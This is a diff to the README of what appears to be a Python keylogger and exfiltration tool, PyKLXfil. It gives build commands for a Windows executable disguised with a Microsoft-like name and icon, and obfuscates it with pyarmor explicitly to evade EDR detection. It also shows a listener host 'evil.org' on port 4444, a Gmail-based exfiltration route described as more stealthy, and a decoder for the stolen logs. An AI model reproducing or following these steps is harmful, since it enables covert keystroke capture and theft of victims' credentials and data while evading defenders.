@@ -25,7 +25,7 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
  #self.host = 'evil.org'
  #self.port = 4444
  ```
- * Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+ * Make obfuscated Windows executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
@@ -35,6 +35,9 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
 ```
+* After recieving the encoded log files, PyKLXfil-Decoder.py can be used to decode them:
+```sh
+python3 PyKLXfil-Decoder.py xxx
 ### Key logging and exfiltration using gmail (more stealthy):
 * Compile and obfuscate the python gmail client for a windows machine (stand alone):
 * Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
@@ -45,7 +48,7 @@ nano PyKLXfil-Client-mail.py
   #app_password = 'qweertyuiop12345678'
   #to = 'example@gmail.com'
 ```
-* Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+* Make obfuscated executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
